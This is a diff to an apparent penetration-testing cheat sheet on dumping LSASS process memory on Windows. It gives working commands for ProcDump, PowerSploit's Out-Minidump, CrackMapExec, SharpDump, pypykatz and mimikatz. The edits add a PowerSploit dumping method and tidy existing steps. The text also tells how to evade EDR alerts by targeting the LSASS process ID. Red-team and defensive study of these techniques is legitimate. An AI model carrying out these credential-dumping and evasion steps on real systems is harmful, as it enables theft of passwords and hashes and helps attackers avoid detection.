@@ -239,17 +239,25 @@ if ($DevGuard.SecurityServicesRunning -contains 1) {"Credential Guard running"}
 
 - GUI access
 Open the Task Manager > Details > right click on lsass.exe > Create dump file
+Transfer the dump to a Kali VM using scp.
+pypykatz lsa dump lsass.dmp
 
 - ProcDump
-curl https://live.sysinternals.com/tools/procdump.exe  -o procdump.exe
+curl https://live.sysinternals.com/tools/procdump.exe -o procdump.exe
 procdump.exe -accepteula -ma lsass.exe lsass.dmp
 
-Some EDR solutions will alert or block this based on the “lsass” process name. This can usually be bypassed by specifying the LSASS process ID instead.
+Some EDR solutions will alert or block this based on the “lsass” process name.
+This can usually be bypassed by specifying the LSASS process ID instead.
 tasklist | findstr lsass
 procdump.exe -accepteula -ma <PID> lsass.dmp
 
-Transfer dump to Kali VM, then use pypykatz to extract the stored credentials and hashes.
-pypykatz lsa dump lsass.dmp
+- PowerSploit
+cp /usr/share/windows-resources/powersploit/Exfiltration/Out-Minidump.ps1 .
+Edit the file by removing the usage (lines 3-68).
+Transfer the file to the target.
+Open PowerShell as Administrator.
+. .\Out-Minidump.ps1
+Get-Process lsass | Out-Minidump
 
 - CME
 crackmapexec smb <target IP> -u <admin user> -p <password> --lsa
@@ -257,9 +265,9 @@ Output stored in ~/.cme/logs/
 
 -SharpDump
 /opt/SharpCollection/NetFramework_4.7_x64/SharpDump.exe
-Transfer file to target.
+Transfer the file to the target.
 SharpDump.exe
-Transfer dump to Windows VM.
+Transfer the dump to a Windows VM.
 Rename debug<PID>.bin to debug<PID>.gz
 mimikatz.exe
 sekurlsa::minidump C:\Users\joe\debug<PID>
